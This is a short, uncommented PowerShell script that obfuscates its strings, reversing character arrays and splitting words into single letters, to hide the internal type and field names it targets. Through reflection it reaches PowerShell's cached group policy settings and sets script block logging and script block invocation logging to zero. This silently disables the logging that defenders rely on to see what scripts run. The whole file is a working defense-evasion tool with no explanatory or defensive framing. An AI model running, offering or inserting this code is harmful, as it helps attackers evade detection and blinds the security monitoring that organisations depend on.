$nop = "N" + "o" + "n" + "P" + "u" + "b" + "l" + "i" + "c"
$sta = "S" + "t" + "a" + "t" + "i" + "c"

$af = ('s','l','i','t','U') -join ''
$ae = ('n','o','i','t','a','m','o','t','u','A') -join ''
$ad = ('t','n','e','m','e','g', 'a','n','a','M') -join ''
$ac = ('m','e','t','s','y','S') -join ''
$ag = ([regex]::Matches($af,'.','RightToLeft') | ForEach {$_.value}) -join ''
$ah = ([regex]::Matches($ae,'.','RightToLeft') | ForEach {$_.value}) -join ''
$ai = ([regex]::Matches($ad,'.','RightToLeft') | ForEach {$_.value}) -join ''
$aj = ([regex]::Matches($ac,'.','RightToLeft') | ForEach {$_.value}) -join ''

$am = $aj + '.' + $ai + '.' + $ah + '.' + $ag

$an = ('d','e','h','c','a','c') -join ''
$ao = ('p','u','o','r','G') -join ''
$ap = ('y','c','i','l','o','P') -join ''
$aq = ('s','g','n','i','t','t','e','S') -join ''
$ar = ([regex]::Matches($an,'.','RightToLeft') | ForEach {$_.value}) -join ''
$as = ([regex]::Matches($ao,'.','RightToLeft') | ForEach {$_.value}) -join ''
$at = ([regex]::Matches($ap,'.','RightToLeft') | ForEach {$_.value}) -join ''
$au = ([regex]::Matches($aq,'.','RightToLeft') | ForEach {$_.value}) -join ''

$av = $ar + $as + $at + $au

$GPOField = [Ref].Assembly.GetType($am).GetField($av, "$nop,$sta")
$CV = $GpoField.GetValue($null)
$sbl1 = "S" + "c" + "r" + "i" + "p" + "t"
$sbl2 = "B" + "l" + "o" + "c" + "k"
$sbl3 = "L" + "o" + "g" + "g" + "i" + "n" + "g"
$sbl = $sbl1 + $sbl2 + $sbl3

if ($CV -eq $null) {

    $NS = @{}
    $NS["$sbl"] = @{}

    $GPOField.SetValue($null, $NS)
    $CV = $NS
}

$esbl1 = "E" + "n" + "a" + "b" + "l" + "e"
$esbl2 = "S" + "c" + "r" + "i" + "p" + "t"
$esbl3 = "B" + "l" + "o" + "c" + "k"
$esbl4 = "L" + "o" + "g" + "g" + "i" + "n" + "g"
$esbl = $esbl1 + $esbl2 + $esbl3 + $esbl4

$esbil1 = "E" + "n" + "a" + "b" + "l" + "e"
$esbil2 = "S" + "c" + "r" + "i" + "p" + "t"
$esbil3 = "B" + "l" + "o" + "c" + "k"
$esbil4 = "I" + "n" + "v" + "o" + "c" + "a" + "t" + "i" + "o" + "n"
$esbil5 = "L" + "o" + "g" + "g" + "i" + "n" + "g"
$esbil = $esbil1 + $esbil2 + $esbil3 + $esbil4 + $esbil5

if (-not $CV.ContainsKey("$sbl")) {
    $CV["$sbl"] = @{}
}

$CV["$sbl"]["$esbl"] = 0
$CV["$sbl"]["$esbil"] = 0

